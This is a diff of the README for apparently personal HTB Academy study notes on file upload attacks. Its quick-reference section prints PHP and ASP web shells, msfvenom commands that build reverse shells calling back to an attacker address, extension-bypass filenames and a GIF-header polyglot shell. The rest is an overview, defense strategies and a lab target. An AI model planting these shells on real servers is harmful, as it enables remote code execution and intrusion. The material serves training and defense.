@@ -1,35 +1,39 @@
-# File Upload Attacks - HTB Academy Guide
+# 📤 File Upload Attacks
 
 > Complete guide covering file upload vulnerabilities, exploitation techniques, bypass methods, and defense strategies from HTB Academy's File Upload Attacks module.
 
 ## 📚 Table of Contents
 
 ### Core Techniques
-- **[Upload Exploitation](./upload-exploitation.md)** - Web shells, reverse shells, and payload execution
-- **[Client-Side Validation](./client-side-validation.md)** - Bypassing JavaScript-based frontend filtering
-- **[Blacklist Filters](./blacklist-filters.md)** - Extension fuzzing and blacklist bypass techniques
-- **[Basic Bypass Techniques](./basic-bypass-techniques.md)** - Whitelist bypasses, double extensions, character injection
-- **[Type Filters](./type-filters.md)** - Content-Type manipulation and MIME-Type magic bytes bypass
-- **[Limited File Uploads](./limited-file-uploads.md)** - XSS, XXE, and DoS attacks on secure upload forms
-- **[Advanced Bypass Methods](./advanced-bypass-methods.md)** - Complex filtering evasion techniques
-- **[Other Upload Attacks](./other-upload-attacks.md)** - Alternative attack vectors and techniques
+
+* [**Upload Exploitation**](upload-exploitation.md) - Web shells, reverse shells, and payload execution
+* [**Client-Side Validation**](client-side-validation.md) - Bypassing JavaScript-based frontend filtering
+* [**Blacklist Filters**](blacklist-filters.md) - Extension fuzzing and blacklist bypass techniques
+* [**Basic Bypass Techniques**](basic-bypass-techniques.md) - Whitelist bypasses, double extensions, character injection
+* [**Type Filters**](type-filters.md) - Content-Type manipulation and MIME-Type magic bytes bypass
+* [**Limited File Uploads**](limited-file-uploads.md) - XSS, XXE, and DoS attacks on secure upload forms
+* [**Advanced Bypass Methods**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/file-upload-attacks/advanced-bypass-methods.md) - Complex filtering evasion techniques
+* [**Other Upload Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/file-upload-attacks/other-upload-attacks.md) - Alternative attack vectors and techniques
 
 ### Defense & Testing
-- **[Prevention & Hardening](./prevention-hardening.md)** - Secure file upload implementation
-- **[Skills Assessment Walkthrough](./skills-assessment-walkthrough.md)** - Complete HTB Academy lab solutions
 
----
+* [**Prevention & Hardening**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/file-upload-attacks/prevention-hardening.md) - Secure file upload implementation
+* [**Skills Assessment Walkthrough**](skills-assessment-walkthrough.md) - Complete HTB Academy lab solutions
+
+***
 
 ## Quick Reference
 
 ### 🎯 **Essential Upload Attack Payloads**
 
 **PHP Web Shell (Basic):**
+
 ```php
 <?php system($_REQUEST['cmd']); ?>
 ```
 
 **PHP Web Shell (Advanced):**
+
 ```php
 <?php 
 if(isset($_REQUEST['cmd'])){ 
@@ -43,11 +47,13 @@ if(isset($_REQUEST['cmd'])){
 ```
 
 **ASP.NET Web Shell:**
+
 ```asp
 <% eval request('cmd') %>
 ```
 
 **Reverse Shell Generation:**
+
 ```bash
 # PHP Reverse Shell
 msfvenom -p php/reverse_php LHOST=10.10.14.55 LPORT=4444 -f raw > reverse.php
@@ -60,6 +66,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.55 LPORT=4444 -f aspx > rev
 ```
 
 ### 🔧 **Common Bypass Techniques**
+
 ```bash
 # Extension Bypasses
 file.php.jpg        # Double extension
@@ -83,55 +90,61 @@ GIF89a<?php system($_GET['cmd']); ?>    # Full GIF header + PHP
 ```
 
 ### 🎯 **HTB Academy Coverage**
-- ✅ **Upload Exploitation (Page 3)** - Web shells, reverse shells, msfvenom integration
-- ✅ **Client-Side Validation (Page 4)** - Burp Suite interception, DevTools manipulation
-- ✅ **Blacklist Filters (Page 5)** - Extension fuzzing, .phtml bypass, case sensitivity
-- ✅ **Whitelist Filters (Page 6)** - Double extensions, character injection, null bytes
-- ✅ **Type Filters (Page 7)** - Content-Type headers, MIME-Type magic bytes (GIF8), combined attacks
-- ✅ **Limited File Uploads (Page 8)** - XSS via SVG/HTML, XXE file disclosure, DoS attacks (ZIP bomb, pixel flood)
-- ✅ **Complete Lab Solutions** - All HTB Academy flags and step-by-step walkthroughs
-- ✅ **Advanced Techniques** - Server misconfigurations, automated wordlist generation, polyglot files
 
----
+* ✅ **Upload Exploitation (Page 3)** - Web shells, reverse shells, msfvenom integration
+* ✅ **Client-Side Validation (Page 4)** - Burp Suite interception, DevTools manipulation
+* ✅ **Blacklist Filters (Page 5)** - Extension fuzzing, .phtml bypass, case sensitivity
+* ✅ **Whitelist Filters (Page 6)** - Double extensions, character injection, null bytes
+* ✅ **Type Filters (Page 7)** - Content-Type headers, MIME-Type magic bytes (GIF8), combined attacks
+* ✅ **Limited File Uploads (Page 8)** - XSS via SVG/HTML, XXE file disclosure, DoS attacks (ZIP bomb, pixel flood)
+* ✅ **Complete Lab Solutions** - All HTB Academy flags and step-by-step walkthroughs
+* ✅ **Advanced Techniques** - Server misconfigurations, automated wordlist generation, polyglot files
+
+***
 
 ## Module Overview
 
 File upload vulnerabilities occur when web applications allow users to upload files without proper validation and sanitization. These vulnerabilities can lead to:
 
 ### **💀 Critical Impacts:**
-- **Remote Code Execution (RCE)** - Execute arbitrary commands on the server
-- **Web Shell Deployment** - Persistent backdoor access
-- **Data Exfiltration** - Access sensitive files and databases
-- **Lateral Movement** - Pivot to internal network systems
-- **Website Defacement** - Modify web application content
+
+* **Remote Code Execution (RCE)** - Execute arbitrary commands on the server
+* **Web Shell Deployment** - Persistent backdoor access
+* **Data Exfiltration** - Access sensitive files and databases
+* **Lateral Movement** - Pivot to internal network systems
+* **Website Defacement** - Modify web application content
 
 ### **🎯 Attack Vectors:**
-- **Unrestricted File Upload** - No validation on file types
-- **Client-side Validation Only** - JavaScript-based filtering
-- **Inadequate Server-side Validation** - Weak filtering mechanisms
-- **File Type Confusion** - MIME type and extension mismatches
-- **Path Traversal** - Directory traversal via filename manipulation
+
+* **Unrestricted File Upload** - No validation on file types
+* **Client-side Validation Only** - JavaScript-based filtering
+* **Inadequate Server-side Validation** - Weak filtering mechanisms
+* **File Type Confusion** - MIME type and extension mismatches
+* **Path Traversal** - Directory traversal via filename manipulation
 
 ### **🛡️ Defense Strategies:**
-- **Whitelist Approach** - Allow only specific file types
-- **Server-side Validation** - Comprehensive file checking
-- **File Content Inspection** - Magic byte verification
-- **Secure Storage** - Non-executable upload directories
-- **Filename Sanitization** - Remove dangerous characters
 
----
+* **Whitelist Approach** - Allow only specific file types
+* **Server-side Validation** - Comprehensive file checking
+* **File Content Inspection** - Magic byte verification
+* **Secure Storage** - Non-executable upload directories
+* **Filename Sanitization** - Remove dangerous characters
+
+***
 
 ## HTB Academy Labs Covered
 
 ### **🧪 Practical Exercises:**
-- **Upload Exploitation Lab** - Basic web shell deployment
-- **Bypass Techniques Lab** - Filter evasion methods  
-- **Advanced Attacks Lab** - Complex exploitation scenarios
-- **Defense Implementation Lab** - Secure upload configuration
+
+* **Upload Exploitation Lab** - Basic web shell deployment
+* **Bypass Techniques Lab** - Filter evasion methods
+* **Advanced Attacks Lab** - Complex exploitation scenarios
+* **Defense Implementation Lab** - Secure upload configuration
 
 ### **🎯 Skills Assessment:**
-- **Target:** \`94.237.49.23:52640\`
-- **Objective:** Upload web shell and retrieve \`/flag.txt\`
-- **Techniques:** Extension bypass, content-type manipulation, payload execution
+
+* **Target:** \`94.237.49.23:52640\`
+* **Objective:** Upload web shell and retrieve \`/flag.txt\`
+* **Techniques:** Extension bypass, content-type manipulation, payload execution
 
 This module provides comprehensive coverage of file upload attack vectors, from basic exploitation to advanced bypass techniques, with practical HTB Academy lab solutions and real-world defense strategies.
